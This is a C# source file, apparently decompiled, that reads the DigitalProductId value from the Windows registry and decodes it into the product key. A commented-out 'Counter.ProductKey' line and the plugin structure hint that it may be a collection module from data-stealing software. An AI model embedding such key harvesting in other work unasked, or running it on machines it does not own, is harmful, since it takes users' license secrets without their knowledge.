using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Plugin
{
    internal class ActivationKey
    {
		internal static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
		{
			string text = string.Empty;
			byte b = (byte)(((int)digitalProductId[66] / (int)6) & (int)1);

			digitalProductId[66] = (byte)(((int)digitalProductId[66] & (int)247) | (((int)b & (int)2) * (int)4));

			int num = 0;
			for (int i = 24; i >= 0; i--)
			{
				int num2 = 0;
				for (int j = 14; j >= 0; j--)
				{
					num2 *= 256;
					num2 = (int)digitalProductId[j + 52] + num2;
					digitalProductId[j + 52] = (byte)(num2 / 24);
					num2 %= 24;
					num = num2;
				}
				text = "BCDFGHJKMPQRTVWXY2346789"[num2] + text;
			}
			string str = text.Substring(1, num);
			string str2 = text.Substring(num + 1, text.Length - (num + 1));
			text = str + "N" + str2;
			for (int k = 5; k < text.Length; k += 6)
			{
				text = text.Insert(k, "-");
			}
			return text;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00003660 File Offset: 0x00001860
		private static string DecodeProductKey(byte[] digitalProductId)
		{
			char[] array = new char[]
			{
			'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P',
			'Q', 'R', 'T', 'V', 'W', 'X', 'Y', '2', '3', '4',
			'6', '7', '8', '9'
			};
			char[] array2 = new char[29];
			ArrayList arrayList = new ArrayList();
			for (int i = 52; i <= 67; i++)
			{
				arrayList.Add(digitalProductId[i]);
			}
			for (int j = 28; j >= 0; j--)
			{
				if ((j + 1) % 6 == 0)
				{
					array2[j] = '-';
				}
				else
				{
					int num = 0;
					for (int k = 14; k >= 0; k--)
					{
						int num2 = (num << 8) | (int)((byte)arrayList[k]);
						arrayList[k] = (byte)(num2 / 24);
						num = num2 % 24;
						array2[j] = array[num];
					}
				}
			}
			return new string(array2);
		}

		// Token: 0x0600002D RID: 45 RVA: 0x0000371C File Offset: 0x0000191C
		private static string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, ActivationKey.DigitalProductIdVersion digitalProductIdVersion)
		{
			if (digitalProductIdVersion == ActivationKey.DigitalProductIdVersion.Windows8AndUp)
			{
				return ActivationKey.DecodeProductKeyWin8AndUp(digitalProductId);
			}
			return ActivationKey.DecodeProductKey(digitalProductId);
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00003744 File Offset: 0x00001944
		public static string GetWindowsProductKeyFromRegistry()
		{
            try
            {
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
				object value = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").GetValue("DigitalProductId");
				if (value == null)
				{
					return "Failed to get DigitalProductId from registry";
				}
				byte[] digitalProductId = (byte[])value;
				registryKey.Close();
				bool flag = (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2) || Environment.OSVersion.Version.Major > 6;
				//Counter.ProductKey = true;
				return ActivationKey.GetWindowsProductKeyFromDigitalProductId(digitalProductId, flag ? ActivationKey.DigitalProductIdVersion.Windows8AndUp : ActivationKey.DigitalProductIdVersion.UpToWindows7);

			}
			catch {}
			return null;
		}

		// Token: 0x02000005 RID: 5
		internal enum DigitalProductIdVersion
		{
			// Token: 0x0400002D RID: 45
			UpToWindows7,
			// Token: 0x0400002E RID: 46
			Windows8AndUp
		}
	}
}
